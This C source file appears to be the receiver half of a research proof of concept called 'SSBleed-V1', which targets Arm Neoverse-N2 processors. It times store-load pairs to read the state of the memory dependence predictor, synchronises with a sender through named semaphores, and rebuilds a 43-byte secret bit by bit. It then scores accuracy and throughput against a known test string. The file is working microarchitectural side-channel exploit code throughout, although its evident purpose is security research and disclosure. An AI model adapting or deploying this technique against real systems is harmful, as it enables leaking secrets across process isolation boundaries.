/*
 * Copyright (c) 2025 Chang Liu
 * SPDX-License-Identifier: Apache-2.0
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <semaphore.h>

#define MDP_HIT_THRESHOLD 80
#define SECRET_INFERENCE_BOUND 15
#define secret_len 43

#define LOOP_TIMING 20

/**
 * Get timestamps through CNTVCT_EL0
 */
static inline uint64_t gettime() {
    uint64_t time;
    asm volatile(
        "dsb sy \n\t"
        "isb \n\t"
        "mrs %0, cntvct_el0 \n\t"
        "isb \n\t"
        :"=r"(time)
    );
    return time;
}

int message[8 * secret_len];

extern void stld(void* addr1, void* addr2);

/**
 * Probe MDP state by timing non-dependent store-load pairs
 */
int probe_analyse(uint64_t* timing, int start, int end) {
    int cnt = 0;
    for(int i = start; i <= end; ++ i) {
        cnt += timing[i] > MDP_HIT_THRESHOLD ? 1 : 0;
    }
    return cnt;
}

/**
 * Convert bits to bytes
 */
void decode(int* message) {
    char recovered_secret[secret_len];
    for(int i = 0; i < secret_len; i ++) {
        recovered_secret[i] = 0;
        for(int j = 0; j < 8; ++ j) {
            recovered_secret[i] |= (message[i * 8 + j] & 1) << j;
        }
    }
    for(int i = 0; i < secret_len; ++ i) {
        printf("%c (%x)\n", recovered_secret[i], (int)recovered_secret[i]);
    }
}

/**
 * Evaluate the accuracy of the inferred bits
 */
double evaluation(int* recovered_message) {
    int acc = 0;
    int ground_truth_bits[8 * secret_len];
    char* ground_truth = "SSBleed-V1 Proof-of-concept on Neoverse-N2\0";
    for(int i = 0; i < secret_len; i ++) {
        for(int j = 0; j < 8; ++ j) {
            ground_truth_bits[i * 8 + j] = (ground_truth[i] >> j) & 1;
        }
    }
    for(int i = 0; i < 8 * secret_len; ++ i) {
        if (recovered_message[i] == ground_truth_bits[i])
            acc ++;
    }
    return (double) acc / (8 * secret_len);
}

int main() {
    int ptr[100];
    uint64_t time_log[LOOP_TIMING];
    register uint64_t time1, time2;
    int recovered_message[8 * secret_len];

    sem_t *mutex1 = sem_open("/name_sem1", O_CREAT, 0644, 0);
    sem_t *mutex2 = sem_open("/name_sem2", O_CREAT, 0644, 0);
    struct timeval cc_time1, cc_time2;
    gettimeofday(&cc_time1, NULL);
    // Reset the MDP state
    for(int j = 0; j < 3; ++ j) {
        stld(ptr, ptr);
    }
    sem_post(mutex2);
    for(int s = 0; s < 8 * secret_len; ++ s) {
        sem_wait(mutex1);  // Synchronize
        // Probe the MDP state
        for(int j = 0; j < LOOP_TIMING; ++ j) {
            time1 = gettime();
            stld(ptr, ptr + 16);
            time2 = gettime();
            time_log[j] = time2 - time1;
        }
        // Reset the MDP state
        for(int j = 0; j < 3; ++ j) {
            stld(ptr, ptr);
        }
        sem_post(mutex2);  // Synchronize
        int recover[2] = {0};
        int prob = probe_analyse((uint64_t*) &time_log[0], 0, 14);
        // printf("%d ", prob);
        recover[prob == SECRET_INFERENCE_BOUND ? 0 : 1] ++;
        recovered_message[s] = recover[0] > 0 ? 0 : 1; 
    }
    gettimeofday(&cc_time2, NULL);
    uint64_t elapsed_time_msec = 
        (cc_time2.tv_sec - cc_time1.tv_sec) * 1000000 + (cc_time2.tv_usec - cc_time1.tv_usec);
    decode(recovered_message);
    printf("accuracy: %.4f, throughput: %.4f bps\n", 
        evaluation(recovered_message), (double) secret_len * 8 * 1000000 / elapsed_time_msec);
    sem_close(mutex1);
    sem_close(mutex2);
    sem_unlink("/name_sem1");
    sem_unlink("/name_sem2");
    return 0;
}